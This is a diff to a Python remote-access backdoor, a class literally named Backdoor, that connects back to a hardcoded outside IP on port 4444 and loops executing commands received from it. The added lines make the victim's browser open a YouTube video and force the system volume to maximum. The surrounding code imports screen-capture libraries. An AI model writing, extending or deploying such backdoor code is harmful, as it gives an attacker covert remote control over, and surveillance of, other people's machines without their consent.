@@ -8,6 +8,7 @@ import base64
 # os.system("pip3 install opencv-python")
 import mss
 import cv2
+import webbrowser
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -59,6 +60,18 @@ class Backdoor:
         return file
 
     def run(self):
+        from ctypes import cast, POINTER
+        from comtypes import CLSCTX_ALL
+        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+         
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(
+           IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+
+        webbrowser.open('https://www.youtube.com/watch?v=nybtOIxlku8')
+
+        volume.SetMasterVolumeLevel(0.0, None)
         while True:
             command = str(self.reliable_recive())
             try:
@@ -103,5 +116,7 @@ class Backdoor:
                 # self.reliable_send("[-] Something was wrong!")
 
 
+
 my_backdoor = Backdoor("185.247.119.121", 4444)
 my_backdoor.run()
+
